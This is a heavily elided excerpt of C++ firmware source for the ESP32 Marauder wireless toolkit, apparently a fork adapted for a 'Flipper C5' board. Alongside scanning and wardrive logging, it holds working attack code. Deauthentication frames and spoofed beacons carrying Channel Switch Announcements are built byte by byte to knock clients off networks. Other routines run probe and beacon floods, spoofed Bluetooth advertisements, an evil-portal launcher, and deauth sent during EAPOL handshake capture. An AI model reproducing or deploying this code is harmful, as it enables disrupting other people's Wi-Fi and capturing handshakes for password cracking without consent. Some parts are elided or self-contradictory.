...
extern "C" int marauder_raw_frame_sanity_check(int32_t arg, int32_t arg2,
                                               int32_t arg3) {
  if (arg == 31337)
    return 1;
  else
...
WiFiScan::GetUniversalAdvertisementData(EBLEPayloadType Type) {
  ...
  case FlipperZero: {
    ...
    // Allocate space for the full Advertisement Data section based on the hex
    // dump
    AdvData_Raw = new uint8_t[31]; // Adjusted to the specific length of the
                                   // data in the dump
    ...
    AdvData_Raw[i++] =
        0x80 + (rand() % 3) + 1; // Service UUID (part of hex dump)
    AdvData_Raw[i++] = 0x30;
  ...
  case Airtag: {
    for (int i = 0; i < airtags->size(); i++) {
      if (airtags->get(i).selected) {
        AdvData.addData(airtags->get(i).payload.data(),
                        airtags->get(i).payloadSize);
...
"")) { #ifdef HAS_SCREEN lv_obj_t * mbox1 = lv_msgbox_create(lv_scr_act(),
NULL); lv_msgbox_set_text(mbox1, text_table4[2]); lv_msgbox_add_btns(mbox1,
btns); lv_obj_set_width(mbox1, 200); lv_obj_align(mbox1, NULL, LV_ALIGN_CENTER,
0, 0); //Align to the corner #endif this->wifi_initialized = true; return;
  }
...
void WiFiScan::startWiFiAttacks(uint8_t scan_mode, uint16_t color,
                                String title_string) {
// Common wifi attack configurations
  ...
  packets_sent = 0;
#ifdef MARAUDER_FLIPPER_C5
  // Use APSTA mode: keeps STA event loop alive AND opens AP interface for
  // deauth injection Pure STA mode blocks frame type 0xC0 (deauth). APSTA
...
String WiFiScan::getStaMAC() {
  ...
  this->wifi_initialized = true;
  sprintf(macAddrChr, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2],
          mac[3], mac[4], mac[5]);
  this->shutdownWiFi();
...
String WiFiScan::security_int_to_string(int security_type) {
  // Provide a security type int from WiFi.encryptionType(i) to convert it to a
  // String which Wigle CSV expects.
  String authtype = "";
...
void WiFiScan::parseBSSID(const char *bssidStr, uint8_t *bssid) {
  sscanf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X", &bssid[0], &bssid[1],
...
void WiFiScan::RunSaveAPList(bool save_as) {
  if (save_as) {
    ...
    for (int i = 0; i < access_points->size(); i++) {
      ...
      char bssidStr[18];
      sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X", ap.bssid[0],
...
void WiFiScan::RunEvilPortal(uint8_t scan_mode, uint16_t color) {
  ...
  //   Serial.println("Could not successfully start EvilPortal. Setting
  //   WIFI_SCAN_OFF..."); this->StartScan(WIFI_SCAN_OFF, TFT_MAGENTA); return;
  // }
  // else
  //   Serial.println("Setup EvilPortal. Current mode: " +
...
// Serial.println("Refreshing GPS Data on screen...");
  ...
  display_obj.tft.fillRect(0, (SCREEN_HEIGHT / 3) - 6, SCREEN_WIDTH,
                           SCREEN_HEIGHT - ((SCREEN_HEIGHT / 3) - 6),
                           TFT_BLACK);
  ...
  if (text != "")
    display_obj.tft.println("      Text: " + text);
...
void WiFiScan::RunGPSNmea() {
  ...
  // Clean up screen first
  display_obj.tft.fillRect(0, offset - 6, SCREEN_WIDTH,
                           SCREEN_HEIGHT - (offset - 6), TFT_BLACK);
  ...
  if (buffer && queue_enabled) {
    ...
    if (size) {
      ...
      for (int i = 0; i < size; i++) {
        ...
        if (lines > 0) {
          if (line.unparsed) {
            if (line.type != "" && line.type != "TXT" && line.type != "GGA" &&
                line.type != "RMC") {
...
void WiFiScan::RunInfo() {
  ...
  if (battery_obj.i2c_supported) {
    ...
    display_obj.tft.println(text_table4[33] +
                            (String)battery_obj.battery_level + "%");
#endif
  } else {
#ifdef HAS_SCREEN
  ...
  // #ifdef HAS_SCREEN
  //   display_obj.tft.println(text_table4[35] + (String)temp_obj.current_temp +
  //   " C");
  // #endif
}
  ...
  if (gps_obj.getGpsModuleStatus()) {
    ...
    if (n > 0) {
      for (int i = 0; i < n; i++) {
        ...
        sprintf(this_bssid, "%02X:%02X:%02X:%02X:%02X:%02X", this_bssid_raw[0],
                this_bssid_raw[1], this_bssid_raw[2], this_bssid_raw[3],
                this_bssid_raw[4], this_bssid_raw[5]);
        ...
        String wardrive_line =
            WiFi.BSSIDstr(i) + "," + ssid + "," +
            this->security_int_to_string(WiFi.encryptionType(i)) + "," +
            gps_obj.getDatetime() + "," + (String)WiFi.channel(i) + "," +
            (String)WiFi.RSSI(i) + "," + gps_obj.getLat() + "," +
            gps_obj.getLon() + "," + gps_obj.getAlt() + "," +
...
void WiFiScan::RunBeaconScan(uint8_t scan_mode, uint16_t color) {
  if (scan_mode == WIFI_SCAN_AP)
    ...
    if (gps_obj.getGpsModuleStatus()) {
      startLog("wardrive");
      String header_line =
          "WigleWifi-1.4,appRelease=" + (String)MARAUDER_VERSION +
          ",model=ESP32 Marauder,release=" + (String)MARAUDER_VERSION +
          ",device=ESP32 Marauder,display=SPI TFT,board=ESP32 "
          "Marauder,brand=JustCallMeKoko\nMAC,SSID,AuthMode,FirstSeen,Channel,"
...
void WiFiScan::RunStationScan(uint8_t scan_mode, uint16_t color) {
  ...
  #ifdef MARAUDER_FLIPPER_C5
#ifndef MARAUDER_FLIPPER_C5
    Serial.println("C5: Cleaning RAM...");
#endif
    while (stations->size() > 0) stations->remove(0);
    #ifdef HAS_SCREEN
      display_obj.display_buffer->clear();
    #endif
#ifndef MARAUDER_FLIPPER_C5
    Serial.println("C5: Configuring Sniffer...");
#endif
  #endif
  esp_wifi_set_promiscuous_filter(&filt);
  ...
  if (err != ESP_OK) {
#ifndef MARAUDER_FLIPPER_C5
    Serial.print("C5 Sniffer ERR: ");
    Serial.println(err);
#endif
  } else {
#ifndef MARAUDER_FLIPPER_C5
    Serial.println("C5 Sniffer OK");
#endif
  }
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
...
#ifndef MARAUDER_FLIPPER_C5
            Serial.println("Got non-ascii character: " +
                           (String)(char)snifferPacket->payload[i + 38]);
#endif
          }
        }
        // essid.concat("\": \"\"}}");
        // Serial.println("\n" + (String)(snifferPacket->payload[37]) + " -> " +
        // essid);
...
void WiFiScan::apSnifferCallbackFull(void *buf,
...
// If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    ...
    if ((snifferPacket->payload[0] == 0x80) && (buf == 0)) {
      ...
      for (int i = 0; i < access_points->size(); i++) {
        ...
        for (int x = 0; x < 6; x++) {
          // Serial.println((String)snifferPacket->payload[x + 10] + " | " +
          // (String)access_points->get(i).bssid[x]);
          if (snifferPacket->payload[x + 10] !=
              access_points->get(i).bssid[x]) {
            mac_match = false;
...
// }
        ...
        if (snifferPacket->payload[37] <= 0)
          ...
          int ssid_len = snifferPacket->payload[37];
          if (ssid_len > 32)
            ssid_len = 32; // Standard max length
    ...
    if ((snifferPacket->payload[0] == 0x80) && (buf == 0)) {
      ...
      if (!in_list) {
        ...
        AccessPoint ap = {
            essid,
            snifferPacket->rx_ctrl.channel,
            {snifferPacket->payload[10], snifferPacket->payload[11],
             snifferPacket->payload[12], snifferPacket->payload[13],
             snifferPacket->payload[14], snifferPacket->payload[15]},
            false,
            NULL,
...
String WiFiScan::processPwnagotchiBeacon(const uint8_t *frame, int length) {
  ...
  int jsonStartIndex =
      36; // Adjust based on actual frame structure if necessary
  int jsonEndIndex = length;

  // Locate the actual JSON boundaries by finding '{' and '}'
  while (jsonStartIndex < length && frame[jsonStartIndex] != '{')
    jsonStartIndex++;
  while (jsonEndIndex > jsonStartIndex && frame[jsonEndIndex - 1] != '}')
    jsonEndIndex--;
  ...
  String jsonString =
      String((char *)frame + jsonStartIndex, jsonEndIndex - jsonStartIndex);

  // Estimate an appropriate JSON document size based on payload length
  size_t jsonCapacity =
      jsonString.length() * 1.5; // Adding buffer for ArduinoJson needs
...
void WiFiScan::beaconSnifferCallback(void *buf,
                                     wifi_promiscuous_pkt_type_t type) {
  extern WiFiScan wifi_scan_obj;
...
// If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    ...
    if ((snifferPacket->payload[0] == 0x80) && (buff == 0)) {
      ...
      // Do signal strength stuff first
        ...
        for (int i = 0; i < access_points->size(); i++) {
          if (access_points->get(i).selected) {
            ...
            if (found) {
              ...
              // access_points->get(i).essid + ". Checking RSSI...");
        ...
        if ((targ_ap.rssi + 5 < snifferPacket->rx_ctrl.rssi) ||
            (snifferPacket->rx_ctrl.rssi + 5 < targ_ap.rssi)) {
          targ_ap.rssi = snifferPacket->rx_ctrl.rssi;
          access_points->set(targ_index, targ_ap);
#ifndef MARAUDER_FLIPPER_C5
          Serial.println(
              (String)access_points->get(targ_index).essid +
              " RSSI: " + (String)access_points->get(targ_index).rssi);
#endif
          return;
        }
      }
          ...
          if (do_save) {
            if (n > 0) {
              for (int i = 0; i < n; i++) {
                ...
                Serial.print(" -> ");
                Serial.println(
                    wifi_scan_obj.security_int_to_string(WiFi.encryptionType(i))
                        .c_str());
#endif
              }
            }
            String wardrive_line = (String)addr + "," + essid + "," +
                                   wifi_scan_obj.security_int_to_string(
                                       snifferPacket->rx_ctrl.channel) +
                                   "," + gps_obj.getDatetime() + "," +
                                   (String)snifferPacket->rx_ctrl.channel +
...
void WiFiScan::stationSnifferCallback(void *buf,
                                      wifi_promiscuous_pkt_type_t type) {
#if defined(MARAUDER_FLIPPER_C5) && !defined(MARAUDER_FLIPPER_C5)
  // Logic removed for absolute silence
#endif
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t *)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr *)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  ...
  for (int y = 0; y < 2; y++) {
    for (int i = 0; i < access_points->size(); i++) {
      ...
      for (int x = 0; x < 6; x++) {
        if (snifferPacket->payload[x + offsets[y]] !=
            access_points->get(i).bssid[x]) {
          mac_match = false;
          break;
        }
  ...
  // C5 Aggressive Discovery: MUST match an AP to avoid ghost MACs
  if (!matched_ap) {
    return; // Don't add orphans on C5 to avoid memory corruption/fake MACs
  } else {
    if (ap_is_src) frame_offset = 4;
    else frame_offset = 10;
  }
  ...
  #ifdef MARAUDER_FLIPPER_C5
    // Safety cap: Prevent RAM exhaustion on C5 by limiting the station list
  ...
  Station sta;
  memcpy(sta.mac, &snifferPacket->payload[frame_offset], 6);
  // Get BSSID of the AP (the other side of the conversation)
  uint8_t ap_mac_raw[6];
  if (ap_is_src) memcpy(ap_mac_raw, &snifferPacket->payload[offsets[0]], 6); // Source was AP
  else memcpy(ap_mac_raw, &snifferPacket->payload[offsets[1]], 6); // Dest was AP (usually 4)
  
  memcpy(sta.ap_bssid, ap_mac_raw, 6);
  extern WiFiScan wifi_scan_obj;
  sta.channel = (uint8_t)wifi_scan_obj.set_channel;
  sta.selected = false;
...
void WiFiScan::rawSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
  ...
  if (wifi_scan_obj.currentScanMode == WIFI_SCAN_SIG_STREN) {
    ...
    if ((targ_ap.rssi + 5 < snifferPacket->rx_ctrl.rssi) ||
      ...
      targ_ap.rssi = snifferPacket->rx_ctrl.rssi;
      access_points->set(targ_index, targ_ap);
      Serial.print((String)access_points->get(targ_index).essid +
                   " RSSI: " + (String)access_points->get(targ_index).rssi);
      display_string = (String)access_points->get(targ_index).essid +
                       " RSSI: " + (String)access_points->get(targ_index).rssi;
    } else
      return;
  }
...
void WiFiScan::deauthSnifferCallback(void *buf,
                                     wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t *)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr *)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
...
// If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    ...
    int buf = 0;
#endif
    if ((snifferPacket->payload[0] == 0xA0 ||
         snifferPacket->payload[0] == 0xC0) &&
        (buf == 0)) {
      delay(random(0, 10));
#ifndef MARAUDER_FLIPPER_C5
      Serial.print("RSSI: ");
...
void WiFiScan::probeSnifferCallback(void *buf,
                                    wifi_promiscuous_pkt_type_t type) {
  ...
  if (type == WIFI_PKT_MGMT) {
    ...
    // If we dont the buffer size is not 0, don't write or else we get
    // CORRUPT_HEAP
    // #ifdef HAS_SCREEN
    //  int buf = display_obj.display_buffer->size();
    // #else
...
// with spaces.
        ...
        if (gps_obj.getGpsModuleStatus()) {
          ...
          if (do_save) {
            String wardrive_line = (String)addr + "," + (String)addr + ",," +
                                   gps_obj.getDatetime() + "," +
                                   (String)snifferPacket->rx_ctrl.channel +
                                   "," + (String)snifferPacket->rx_ctrl.rssi +
                                   "," + gps_obj.getLat() + "," +
...
void WiFiScan::beaconListSnifferCallback(void *buf,
                                         wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t *)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr *)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
...
void WiFiScan::broadcastCustomBeacon(uint32_t current_time,
                                     AccessPoint custom_ssid) {
  ...
  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b,
                          0x96, 0x24, 0x30, 0x48, 0x6c, // supported rate
...
#ifdef MARAUDER_FLIPPER_C5
  // Give the RTOS scheduler a tick to free TX DMA buffers (fixes ESP_ERR_NO_MEM
  // / err 257)
  esp_wifi_80211_tx(MARAUDER_IF, packet, sizeof(packet), false);
  vTaskDelay(10);
#else
...
void WiFiScan::sendProbeAttack(uint32_t currentTime) {
  ...
  for (int i = 0; i < access_points->size(); i++) {
    ...
    if (access_points->get(i).selected) {
      ...
      access_points->get(i).essid.toCharArray(
          buf, access_points->get(i).essid.length() + 1);

      for (int i = 0; i < ssidLen; i++)
        prob_req_packet[26 + i] = buf[i];

      uint8_t postSSID[40] = {0x00, 0x00, 0x01, 0x08, 0x8c, 0x12, 0x18, 0x24,
                              0x30, 0x48, 0x60, 0x6c, 0x2d, 0x1a, 0xad, 0x01,
                              0x17, 0xff, 0xff, 0x00, 0x00, 0x7e, 0x00, 0x00,
      ...
      // Send packet
      esp_wifi_80211_tx(MARAUDER_IF, good_probe_req_packet,
...
// Send packet (C5 Nuclear Option: Robust CSA Beacon Spoofing)
#ifdef MARAUDER_FLIPPER_C5
  uint8_t beacon_csa[128];
  memset(beacon_csa, 0, 128);
  beacon_csa[0] = 0x80;              // Beacon frame subtype
  memset(&beacon_csa[4], 0xFF, 6);   // Dest: Broadcast
  memcpy(&beacon_csa[10], bssid, 6); // Source
  memcpy(&beacon_csa[16], bssid, 6); // BSSID

  // Beacon Body (at byte 24)
  // 24-31: Timestamp (8)
  // 32-33: Beacon Interval: 100ms (0x64 0x00)
  // 34-35: Capability Info: ESS (0x01 0x00)
  beacon_csa[32] = 0x64;
  beacon_csa[34] = 0x01;

  // Tag 0: SSID (Empty/Stealth)
  beacon_csa[36] = 0x00;
  beacon_csa[37] = 0x00;
  ...
  beacon_csa[44] = 0x03;
  beacon_csa[45] = 0x01;
  beacon_csa[46] = (uint8_t)channel;

  // Tag 37: CSA (Channel Switch Announcement)
  beacon_csa[47] = 0x25;
  beacon_csa[48] = 0x03;
  beacon_csa[49] = 0x01;                   // Mode 1
  beacon_csa[50] = (uint8_t)(channel + 1); // New channel
  beacon_csa[51] = 0x00;                   // Count 0

  for (int j = 0; j < 3; j++) {
    esp_wifi_80211_tx(WIFI_IF_STA, beacon_csa, 52, false);
    vTaskDelay(1);
  }
  if (packets_sent % 10 == 0) {
    Serial.print("C5-Beacon-CSA (v2): ");
    Serial.println(packets_sent);
  }
  packets_sent += 3;
#else
  esp_wifi_80211_tx(MARAUDER_IF, deauth_frame_default,
...
// Send packet (C5 CSA Stealth Bypass: Action Frame Type 0xD0 + CSA Payload)
#ifdef MARAUDER_FLIPPER_C5
  uint8_t beacon_csa_dst[128];
  memset(beacon_csa_dst, 0, 128);
  beacon_csa_dst[0] = 0x80;
  memcpy(&beacon_csa_dst[4], mac, 6);    // Dest: Target Client
  memcpy(&beacon_csa_dst[10], bssid, 6); // Source: AP
  memcpy(&beacon_csa_dst[16], bssid, 6); // BSSID
  beacon_csa_dst[32] = 0x64;
  beacon_csa_dst[34] = 0x01;
  beacon_csa_dst[36] = 0x00;
  beacon_csa_dst[37] = 0x00;
  beacon_csa_dst[38] = 0x01;
  beacon_csa_dst[39] = 0x04;
  beacon_csa_dst[40] = 0x82;
  beacon_csa_dst[41] = 0x84;
  beacon_csa_dst[42] = 0x8b;
  beacon_csa_dst[43] = 0x96;
  beacon_csa_dst[44] = 0x03;
  beacon_csa_dst[45] = 0x01;
  beacon_csa_dst[46] = (uint8_t)channel;
  beacon_csa_dst[47] = 0x25;
  beacon_csa_dst[48] = 0x03;
  beacon_csa_dst[49] = 0x01;
  beacon_csa_dst[50] = (uint8_t)(channel + 1);
  beacon_csa_dst[51] = 0x00;

  for (int j = 0; j < 3; j++) {
    esp_wifi_80211_tx(WIFI_IF_STA, beacon_csa_dst, 52, false);
    vTaskDelay(1);
  }
  packets_sent = packets_sent + 3;
#else
...
void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel,
  ...
  sscanf(dst_mac_str.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
         &deauth_frame_default[4], &deauth_frame_default[5],
         &deauth_frame_default[6], &deauth_frame_default[7],
         &deauth_frame_default[8], &deauth_frame_default[9]);
...
// Send packet (C5 CSA Stealth Bypass: Action Frame Type 0xD0 + CSA Payload)
#ifdef MARAUDER_FLIPPER_C5
  uint8_t csa_frame[31];
  memcpy(csa_frame, deauth_frame_default, 24);
  csa_frame[0] = 0xD0;
  csa_frame[27] = 0x03;
  csa_frame[28] = 0x01;
  csa_frame[29] = (uint8_t)(channel + 1);
  csa_frame[30] = 0x00;

  for (int i = 0; i < 3; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, csa_frame, 31, false);
    vTaskDelay(1);
  }
  if (packets_sent % 10 == 0) {
    Serial.print("C5-CSA-Bypass (2): ");
    Serial.print(packets_sent);
    Serial.println(" (3 Sent)");
  }
  packets_sent += 3;
#else
  esp_err_t err2 = esp_wifi_80211_tx(MARAUDER_IF, deauth_frame_default,
                                     sizeof(deauth_frame_default), false);

  if (packets_sent % 10 == 0) {
    Serial.print("C5-Deauth-Attack (2): ");
    Serial.print(packets_sent);
    if (err2 != 0) {
      Serial.print(" ERR: ");
      Serial.println(err2);
...
void WiFiScan::sendDeauthAttack(uint32_t currentTime, String dst_mac_str) {
  ...
  for (int i = 0; i < access_points->size(); i++) {
    if (access_points->get(i).selected) {
      ...
      memcpy(target_bssid, access_points->get(i).bssid, 6);
      int target_channel = access_points->get(i).channel;

      this->set_channel = target_channel;
      esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);

      #ifdef MARAUDER_FLIPPER_C5
        uint8_t beacon_csa[64];
        memset(beacon_csa, 0, 64);
        beacon_csa[0] = 0x80;
        memset(&beacon_csa[4], 0xFF, 6);
        memcpy(&beacon_csa[10], target_bssid, 6);
        memcpy(&beacon_csa[16], target_bssid, 6);
        beacon_csa[32] = 0x64; beacon_csa[34] = 0x11;
        beacon_csa[39] = 0x03; beacon_csa[40] = 0x01; beacon_csa[41] = (uint8_t)(target_channel + 1);
        
        for (int j = 0; j < 3; j++) {
          esp_wifi_80211_tx(WIFI_IF_STA, beacon_csa, 43, false);
        }
        packets_sent += 3;
      #else
        // Logic for other chips ...
        packets_sent += 1;
      #endif
    }
  }

  // Station Loop (Our aggressive discovery targets)
  for (int i = 0; i < stations->size(); i++) {
    if (stations->get(i).selected) {
      uint8_t target_bssid[6];
      memcpy(target_bssid, stations->get(i).ap_bssid, 6);
      int target_channel = stations->get(i).channel;

      this->set_channel = target_channel;
      esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);

      #ifdef MARAUDER_FLIPPER_C5
        uint8_t beacon_csa_sta[64];
        memset(beacon_csa_sta, 0, 64);
        beacon_csa_sta[0] = 0x80;
        memset(&beacon_csa_sta[4], 0xFF, 6);
        memcpy(&beacon_csa_sta[10], target_bssid, 6);
        memcpy(&beacon_csa_sta[16], target_bssid, 6);
        beacon_csa_sta[32] = 0x64; beacon_csa_sta[34] = 0x11;
        beacon_csa_sta[39] = 0x03; beacon_csa_sta[40] = 0x01; beacon_csa_sta[41] = (uint8_t)(target_channel + 1);
        
        for (int j = 0; j < 3; j++) {
          esp_wifi_80211_tx(WIFI_IF_STA, beacon_csa_sta, 43, false);
        }
        packets_sent += 3;
      #endif
    }
...
bool WiFiScan::stSelected() {
  for (int i = 0; i < stations->size(); i++) {
    if (stations->get(i).selected) return true;
  }
  return false;
}


void WiFiScan::wifiSnifferCallback(void *buf,
                                   wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t *)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr *)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
...
// If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    ...
    if (snifferPacket->payload[0] == 0x80) {
      num_beacon++;
    } else if ((snifferPacket->payload[0] == 0xA0 ||
                snifferPacket->payload[0] == 0xC0)) {
      num_deauth++;
...
void WiFiScan::eapolSnifferCallback(void *buf,
                                    wifi_promiscuous_pkt_type_t type) {
  extern WiFiScan wifi_scan_obj;
  ...
  if (send_deauth) {
    if (snifferPacket->payload[0] == 0x80) {
      ...
      beacon_csa[0] = 0x80;
      memset(&beacon_csa[4], 0xFF, 6);
      memcpy(&beacon_csa[10], wifi_scan_obj.deauth_frame_default + 10, 6);
      memcpy(&beacon_csa[16], wifi_scan_obj.deauth_frame_default + 10, 6);
      beacon_csa[32] = 0x64;
      beacon_csa[34] = 0x11;
      beacon_csa[36] = 0x00;
      beacon_csa[37] = 0x00;
      ...
      beacon_csa[39] = 0x03;
      beacon_csa[40] = 0x01;
      beacon_csa[41] = (uint8_t)(wifi_scan_obj.set_channel + 1);
      beacon_csa[42] = 0x00;
      ...
      esp_wifi_80211_tx(MARAUDER_IF, wifi_scan_obj.deauth_frame_default,
                        sizeof(wifi_scan_obj.deauth_frame_default), false);
      delay(1);
#endif
    }
  }

  if (((snifferPacket->payload[30] == 0x88 &&
        snifferPacket->payload[31] == 0x8e) ||
       (snifferPacket->payload[32] == 0x88 &&
        snifferPacket->payload[33] == 0x8e))) {
    num_eapol++;
...
void WiFiScan::activeEapolSnifferCallback(void *buf,
                                          wifi_promiscuous_pkt_type_t type) {
  extern WiFiScan wifi_scan_obj;
...
void WiFiScan::eapolMonitorMain(uint32_t currentTime) {
  ...
  //  for (x_pos = (11 + x_scale); x_pos <= 320; x_pos += x_scale) //go along
  //  every point on the x axis and do something, start over when finished
...
// Do the touch stuff
    ...
    if (currentTime - initTime >= (GRAPH_REFRESH * 5)) {
      ...
      // Plot "X" value
      display_obj.tft.drawLine(x_pos - x_scale, y_pos_x_old, x_pos, y_pos_x,
                               TFT_CYAN);

      // Draw preceding black 'boxes' to erase old plot lines, !!!WEIRD CODE TO
      // COMPENSATE FOR BUTTONS AND COLOR KEY SO 'ERASER' DOESN'T ERASE BUTTONS
      // AND COLOR KEY!!!
      if ((x_pos <= 90) || ((x_pos >= 117) && (x_pos <= 320))) // above x axis
      {
        display_obj.tft.fillRect(x_pos + 1, 28, 10, 93,
                                 TFT_BLACK); // compensate for buttons!
      } else {
        display_obj.tft.fillRect(x_pos + 1, 0, 10, 121,
                                 TFT_BLACK); // don't compensate for buttons!
      }
  ...
  display_obj.tft.fillRect(
      127, 0, 193, 28, TFT_BLACK); // erase XY buttons and any lines behind them
...
// Do the touch stuff
    ...
    if (currentTime - initTime >= GRAPH_REFRESH) {
      ...
      display_obj.tft.drawLine(x_pos - x_scale, y_pos_x_old, x_pos, y_pos_x,
                               TFT_GREEN);
      // Plot "Z" value
      display_obj.tft.drawLine(x_pos - x_scale, y_pos_z_old, x_pos, y_pos_z,
                               TFT_BLUE);
      // Plot "Y" value
      display_obj.tft.drawLine(x_pos - x_scale, y_pos_y_old, x_pos, y_pos_y,
                               TFT_RED);

      // Draw preceding black 'boxes' to erase old plot lines, !!!WEIRD CODE TO
      // COMPENSATE FOR BUTTONS AND COLOR KEY SO 'ERASER' DOESN'T ERASE BUTTONS
      // AND COLOR KEY!!! if ((x_pos <= 90) || ((x_pos >= 198) && (x_pos <=
      // 320))) //above x axis
      if ((x_pos <= 90) || ((x_pos >= 117) && (x_pos <= 320))) // above x axis
      {
        display_obj.tft.fillRect(x_pos + 1, 28, 10, 93,
  ...
  display_obj.tft.fillRect(
      127, 0, 193, 28, TFT_BLACK); // erase XY buttons and any lines behind them
  // tft.fillRect(56, 0, 66, 32, TFT_ORANGE); //erase time and color key and any
  // stray lines behind them
  display_obj.tft.fillRect(12, 0, 90, 32, TFT_BLACK); // key
...
void WiFiScan::main(uint32_t currentTime) {
  if (currentScanMode == WIFI_SCAN_OFF) {
    return;
  }
  ...
  if ((currentScanMode == WIFI_SCAN_PROBE) ||
    ...
    if (currentTime - initTime >= 2000) {
      initTime = millis();
#ifdef MARAUDER_FLIPPER_C5
      Serial.println("[Pulse] Bluetooth Attack active...");
#endif
    ...
    if (currentTime - initTime >= 2000) {
      initTime = millis();
#ifdef MARAUDER_FLIPPER_C5
      Serial.print("[Pulse] Attack active: ");
      Serial.print(packets_sent / 2);
      Serial.println(" pkts/s");
#endif
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
    ...
    if (currentTime - initTime >= 2000) {
      initTime = millis();
#ifdef MARAUDER_FLIPPER_C5
      Serial.print("[Pulse] Manual Attack active: ");
      Serial.print(packets_sent / 2);
      Serial.println(" pkts/s");
#endif
      String displayString = "";
    ...
    #ifdef MARAUDER_FLIPPER_C5
      // Para el C5, usamos directamente nuestro motor optimizado que ya recorre todas las estaciones
      this->sendDeauthAttack(currentTime, this->dst_mac);
      if (currentTime - initTime >= 2000) {
        initTime = millis();
#ifdef MARAUDER_FLIPPER_C5
        Serial.print("[Pulse] Targeted Attack active: ");
        Serial.print(packets_sent / 2);
        Serial.println(" pkts/s");
#endif
        packets_sent = 0;
    ...
    for (int i = 0; i < access_points->size(); i++) {
      if (access_points->get(i).selected)
        this->broadcastCustomBeacon(
            currentTime, ssid{access_points->get(i).essid,
                              random(1, 12),
    ...
    if (currentTime - initTime >= 2000) {
      initTime = millis();
#ifdef MARAUDER_FLIPPER_C5
      Serial.print("[Pulse] Beacon Spam active: ");
      Serial.print(packets_sent / 2);
      Serial.println(" pkts/s");
#endif
#ifndef MARAUDER_FLIPPER_C5
...
#ifdef MARAUDER_FLIPPER_C5
        delay(5); // Increase yield to prevent Core Panic (Load access fault)
#endif
      }
    }
